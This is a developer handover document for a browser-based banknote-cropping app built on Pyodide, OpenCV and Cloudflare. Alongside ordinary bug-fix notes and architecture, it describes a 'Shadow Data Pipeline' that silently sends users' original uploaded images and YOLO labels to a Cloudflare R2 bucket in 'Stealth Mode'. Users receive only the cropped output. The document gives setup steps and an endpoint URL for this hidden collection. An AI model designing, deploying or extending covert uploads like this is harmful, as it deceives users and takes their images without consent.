# Project: Client-Side AI Banknote Cropper with Shadow Data Collection

This document serves as the "Technical DNA" for the project. It details the architecture, key logic, deployment strategy, and **critical troubleshooting history** to ensure seamless handover.

## 1. Project Overview
A serverless, client-side web application that automatically detects, rotates, and crops banknotes. It uses the user's CPU via WebAssembly (Pyodide) and includes a **Shadow Data Pipeline** to silently collect training data (original images + YOLO coordinates) to Cloudflare R2.

**Tech Stack:**
- **Frontend:** HTML5, Tailwind CSS, Vite.
- **AI Engine:** PyScript (Pyodide) running Python 3.12.
- **Libraries:** OpenCV (opencv-python), NumPy.
- **Backend:** Cloudflare Worker + R2 Storage.
- **Deployment:** Cloudflare Pages (Git Integration).

---

## 2. System Architecture & Data Flow

```mermaid
[User Browser]
    |
    |-- (1) LOAD: Vite App + Pyodide Engine
    |
    |-- (2) PROCESS: [script.py] (Local CPU)
    |       |-- LOAD: Read Image as Bytes
    |       |-- CORE LOGIC (Ported from old_findcash.py):
    |       |     |-- Canny Edges + Dilate (71x71 kernel)
    |       |     |-- Connected Components Filter
    |       |     |-- Max Contour -> MinAreaRect (Rotated Rect)
    |       |     |-- Deskew (warpAffine) -> Crop
    |       |
    |       |-- USER OUTPUT: Add Clean Cropped PNG to ZIP
    |       |-- SHADOW DATA: Calculate YOLO Label for *Original* Image
    |
    |-- (3) DOWNLOAD: User gets .zip via Blob URL (Clean PNGs only)
    |
    |-- (4) BACKGROUND UPLOAD (The "Shadow Pipeline"):
            |-- Async XHR Request (Stealth Mode)
            |-- POST /upload ---> [Cloudflare Worker]
                                        |
                                        |-- CORS & Method Check
                                        |-- Save to [R2: shopcropping]
                                                |-- yolo-dataset/images/timestamp_uuid.jpg (Original)
                                                |-- yolo-dataset/labels/timestamp_uuid.txt (YOLO Label)
```

---

## 3. Troubleshooting Log (Battle Scars)
*Essential record of bugs encountered and fixed during development.*

### 🔴 Bug 1: The "Ghost Code" & CSS Syntax Error
* **Symptom:** `SyntaxError: invalid decimal literal` in CSS line.
* **Cause:** Browser caching old `index.html` structure.
* **Fix:** Moved Python logic to `public/script.py` and used query param cache busting (`?v=12`).

### 🔴 Bug 2: Package Loading Race Conditions
* **Symptom:** `ModuleNotFoundError: No module named 'numpy'`.
* **Cause:** `py-config` race condition.
* **Fix:** Manually await `pyodide_js.loadPackage(['numpy', 'opencv-python'])` in async setup.

### 🔴 Bug 3: Memory Explosion on Download
* **Symptom:** Browser crash on ZIP download.
* **Cause:** Large Python Bytes passed by value to JS.
* **Fix:** Use `js.Blob.new([js.Uint8Array.new(...)])` to zero-copy transfer data.

### 🔴 Bug 4: "I/O operation on closed file"
* **Symptom:** ZIP generation failed.
* **Fix:** Manually manage `zipfile` lifecycle (`zf.close()` then read buffer).

### 🔴 Bug 5: R2 Binding & Path Errors (The "500" Nightmare)
* **Symptom:** Worker returns 500.
* **Cause:** Worker binding `DATASET_BUCKET` was pointing to wrong bucket or missing.
* **Fix:** Bound `DATASET_BUCKET` to `shopcropping` in Cloudflare Dashboard. Added `yolo-dataset/` prefix in Worker code.

### 🔴 Bug 6: FormData Content-Type Missing
* **Symptom:** `Parsing a Body as FormData requires a Content-Type header`.
* **Cause:** Pyodide's `js.fetch` does not automatically set multipart boundaries for `FormData`.
* **Fix:** Switched to `js.XMLHttpRequest` for uploads.

---

## 4. Cloudflare R2 Integration Guide

To enable the data collection feature, you must deploy the backend:

### Step 1: Cloudflare Setup
1.  **Create R2 Bucket:** Name it `shopcropping`.
2.  **Create Worker:** Name it `banknote-collector`.
3.  **Deploy Code:** Copy content from `sample.py` (which contains the verified Worker JS) to the Worker.
4.  **Bind R2:** In Worker Settings -> Variables -> R2 Bucket Bindings:
    *   Variable Name: `DATASET_BUCKET` (Must match code exactly).
    *   Bucket: `shopcropping`.

### Step 2: Connect Frontend
1.  Get your Worker URL: `https://banknote-collector.alanalanalan0807.workers.dev`
2.  Update `public/script.py`:
    ```python
    UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev"
    ```
    *(Note: No trailing slash!)*
3.  **Redeploy Frontend.**

---

## 5. File Manifest

*   **`index.html`**: UI Entry point. Loads Pyodide.
*   **`public/script.py`**: **THE BRAIN.**
    *   Contains the "Strong" CV logic (Dilate 71x71, Deskew).
    *   Handles UI progress updates.
    *   Manages ZIP creation (Clean images).
    *   Manages Shadow Uploads (Original Image + YOLO Label).
*   **`sample.py`**: Contains the verified Cloudflare Worker JavaScript code.
*   **`GEMINI.md`**: This documentation.

---
*Last Updated: 2026-01-03 - Stable Release v13 (Strong CV + Shadow Pipeline)*
